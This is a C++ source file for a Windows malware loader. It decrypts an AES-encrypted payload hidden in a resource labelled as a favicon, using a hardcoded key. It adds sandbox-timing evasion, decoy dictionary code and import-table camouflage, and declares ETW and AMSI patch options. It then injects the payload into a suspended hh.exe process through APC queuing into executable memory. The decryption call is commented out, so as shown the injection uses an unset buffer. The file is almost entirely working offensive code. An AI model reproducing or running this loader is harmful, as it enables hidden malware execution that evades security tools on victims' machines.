#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <bcrypt.h>
#include <iostream>
#include <map>
#include <string>
#include "Structs.h"
#include <cstring>
#include "resources.h"

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "user32")


#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

PVOID pPlaintext = NULL;
DWORD dwPlainSize = NULL;

HRSRC FindResource(
  HMODULE hModule,   // handle to the module containing the resource. If NULL, the function searches the module used to create the current process
  LPCTSTR lpName,    // name of the resource. Also, this parameter can be MAKEINTRESOURCE(ID), where ID is the integer identifier of the resource
  LPCTSTR lpType     // resource type, ex. RT_BITMAP, RT_ICON, RT_RCDATA, etc.
);

HGLOBAL LoadResource(
  HMODULE hModule,    // handle to the module whose executable file contains the resource
  HRSRC   hResInfo    // handle to the resource to be loaded (returned by FindResource() function)
);

typedef enum PATCH
{
    PATCH_ETW_EVENTWRITE,
    PATCH_ETW_EVENTWRITE_FULL,
};

typedef enum AMSIPATCH{
    PATCH_AMSI_SCAN_BUFFER,
	PATCH_AMSI_OPEN_SESSIO
};

typedef struct _AES {
    PBYTE   pPlainText;             
    DWORD   dwPlainSize;            
    PVOID   pCipherText;            
    DWORD   dwCipherSize;           
    PBYTE   pKey;                   
    PBYTE   pIv;                    
}AES, * PAES;


BOOL InstallAesDecryption(PAES pAes) {
    BOOL bSTATE = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = NULL;
    DWORD dwBlockSize = NULL;
    DWORD cbKeyObject = NULL;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = NULL;
    NTSTATUS STATUS = NULL;
    
    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    
_EndOfFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}

BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == 0 || pKey == NULL || pIv == NULL)
        return FALSE;
    AES Aes;
    Aes.pKey = pKey;
    Aes.pIv = pIv;
    Aes.pCipherText = pCipherTextData;
    Aes.dwCipherSize = sCipherTextSize;
    if (!InstallAesDecryption(&Aes)) { return FALSE; }
    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}




void evade() {

    FILETIME startTime;
    GetSystemTimeAsFileTime(&startTime);
    Sleep(2000);
    FILETIME endTime;
    GetSystemTimeAsFileTime(&endTime);
    ULARGE_INTEGER start, end;
    start.LowPart = startTime.dwLowDateTime;
    start.HighPart = startTime.dwHighDateTime;
    end.LowPart = endTime.dwLowDateTime;
    end.HighPart = endTime.dwHighDateTime;
    ULONGLONG elapsedTime = end.QuadPart - start.QuadPart;
    elapsedTime /= 10000000;

    if (elapsedTime < 1.5) {
        exit(0);
    }



    std::map<std::string, std::string> dictionary = {
        {"apple", "a fruit"},
        {"car", "a vehicle"},
        {"house", "a place to live"},
        {"book", "a written work"},
        {"chair", "a piece of furniture"},
        {"dog", "a pet animal"},
        {"tree", "a woody plant"},
        {"water", "a liquid substance"},
        {"music", "an art form"},
        {"computer", "an electronic device"},
        {"phone", "a communication device"},
        {"pizza", "a type of food"},
        {"bird", "a feathered animal"},
        {"pen", "a writing instrument"},
        {"table", "a piece of furniture"},
        {"sun", "a star"},
        {"flower", "a plant"},
        {"cloud", "a visible mass of condensed water vapor"},
        {"shoe", "a type of footwear"},
        {"door", "an entry or exit"},
        {"beach", "a sandy area near water"},
        {"mountain", "a large natural elevation"},
        {"bus", "a type of vehicle"},
        {"pencil", "a writing instrument"},
        {"jacket", "an outer garment"},
        {"hat", "a head covering"},
        {"umbrella", "a portable shelter"},
        {"lamp", "a source of light"},
        {"clock", "a timepiece"},
        {"cake", "a sweet baked food"},
        {"guitar", "a musical instrument"},
        {"bottle", "a container for liquids"},
        {"ball", "a round object used in games"}
    };
}

void printDictionary(const std::map<std::string, std::string>& dictionary) {
    for (const auto& entry : dictionary) {
        printf(entry.first.c_str());
    }
}

int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
}

PVOID Helper(PVOID *ppAddress) {

	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (!pAddress)
		return NULL;
	
	
	*(int*)pAddress = RandomCompileTimeSeed() % 0xFF;
	
	
	*ppAddress = pAddress;
	return pAddress;
}

VOID IatCamouflage() {

	PVOID		pAddress	= NULL;
	int*		A		    = (int*)Helper(&pAddress);
		
	if (*A > 350) {		
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessageW(NULL, NULL);
	}

	
	HeapFree(GetProcessHeap(), 0, pAddress);
}

int main(int argc, char* argv[]) {
    evade();
    
    HGLOBAL resHandle = NULL;
    HRSRC res;
    
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);

    resHandle = LoadResource(NULL, res);

    char * payload;

    payload = (char *) LockResource(resHandle);

    int payload_len = SizeofResource(NULL, res);

    unsigned char AesKey[] = {
        0xF7, 0xA8, 0x64, 0xF4, 0x6A, 0x47, 0xDF, 0xBD, 0xA6, 0x11, 0x4B, 0x5D, 0x54, 0x99, 0x3C, 0x2E, 
        0x38, 0x24, 0x38, 0xAA, 0xB7, 0x15, 0x60, 0x7E, 0x96, 0xA8, 0x52, 0xDF, 0x04, 0xE3, 0x4F, 0x21 };

    unsigned char AesIv[] = {
        0x38, 0xC6, 0x7E, 0x1C, 0x24, 0xD6, 0x0F, 0x67, 0x82, 0x3C, 0xA2, 0x9F, 0x47, 0xE4, 0x05, 0xA8 };

    //SimpleDecryption(payload, payload_len, AesKey, AesIv, &pPlaintext, &dwPlainSize);

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    CreateProcessA("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;


    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, dwPlainSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    
    WriteProcessMemory(victimProcess, shellAddress, pPlaintext, dwPlainSize, NULL);

    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

    ResumeThread(threadHandle);
}
